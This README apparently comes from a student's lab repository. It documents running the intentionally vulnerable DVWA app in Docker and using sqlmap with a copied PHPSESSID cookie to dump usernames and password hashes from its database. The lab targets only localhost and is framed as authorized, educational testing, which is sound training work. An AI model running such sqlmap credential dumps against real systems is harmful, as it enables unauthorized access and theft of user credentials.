# DVWA + SQLMap Project

This repository contains my DVWA (Damn Vulnerable Web Application) local setup and SQLMap testing notes.  
**Sensitive data (session IDs, password hashes, etc.) have been redacted in the provided images.**

## Summary
I used Docker to run DVWA locally and exercised SQL Injection (SQLi) using `sqlmap`. The goal was to demonstrate how to:
- Run DVWA in Docker
- Interact with the SQL Injection challenge in the web UI
- Capture a session cookie from browser Developer Tools
- Use `sqlmap` with the session cookie to dump user data from the `dvwa` database

> **Important:** These techniques are for educational and authorized testing only. Do **not** attack systems without explicit permission.

## Steps I followed (commands)

1. Update Kali:
```bash
sudo apt update
```

2. Install Docker:
```bash
sudo apt install -y docker.io
```

3. Enable Docker:
```bash
sudo systemctl enable docker --now
```

4. Add your user to the docker group:
```bash
sudo usermod -aG docker $USER
# Log out and log back in for group changes to apply
```

5. Pull the DVWA Docker image:
```bash
docker pull vulnerables/web-dvwa
```

6. Run DVWA container (multi-arch support):
```bash
sudo docker run --rm --privileged tonistiigi/binfmt --install all
docker run --rm --platform linux/amd64 -p 80:80 vulnerables/web-dvwa
```

7. Access DVWA in your browser:
```
http://localhost
```

8. Default credentials:
- Username: `admin`
- Password: `password`

9. In the DVWA web UI:
- Login and create the database (follow the on-screen prompt).
- Select **SQL Injection** from the left menu.
- Enter a value and click **Submit**.
- Right-click and Inspect &rarr; Network tab &rarr; click the Submit request &rarr; copy the `PHPSESSID` cookie.

10. Example `sqlmap` usage (replace placeholders safely):
```bash
sqlmap -u "http://localhost/vulnerabilities/sqli/?id=NNK&Submit=Submit" \
  --cookie="PHPSESSID=<REDACTED>; security=low" -D dvwa -T users -C user,password --dump
```

## Files included
- `README.md` (this file)
- `redacted_images/` — sanitized screenshots (session IDs and password hashes removed)

## Notes & Recommendations
- Always remove or redact session cookies, authentication tokens, and password hashes before sharing screenshots.
- Use a disposable/local environment (like Docker) when testing intentionally vulnerable apps.
- If you plan to share this repository publicly, double-check logs and config files for secrets.

---

**Sanitized images saved to:** `redacted_images/`


